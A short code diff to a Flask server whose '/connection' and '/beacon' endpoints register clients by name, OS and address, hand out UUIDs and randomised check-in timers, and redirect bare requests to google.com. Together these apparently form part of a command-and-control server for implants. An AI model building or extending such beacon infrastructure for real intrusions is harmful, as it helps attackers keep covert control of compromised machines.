@@ -13,8 +13,8 @@ def connection():
     address = request.args.get('address')
 
     if name and os and address:
-        add_connection_list(None, (address, 0), name, os)
         userID = str(uuid.uuid4())
+        add_connection_list(None, (address, 0), name, os, userID, "beacon")
         return {"timer": 5, "uuid": userID}, 200
     else:
         return Flask.redirect("https://www.google.com", code=302)
@@ -22,10 +22,11 @@ def connection():
 
 @app.route('/beacon', methods=['GET'])
 def beacon():
-    userID = request.args.get('id')
-    if userID in userIDs:
-        if random.choice([True, False]):
-            return {"timer": random.randint(1, 10)}, 200
-        return '', 200
-    else:
-        return '', 404
+    id = request.args.get('id')
+    user_ids = connections.get("user_ids", [])
+    for userID in user_ids:
+        if userID == id:
+            if random.choice([True, False]):
+                return {"timer": random.randint(1, 10)}, 200
+            return '', 200
+    return '', 404
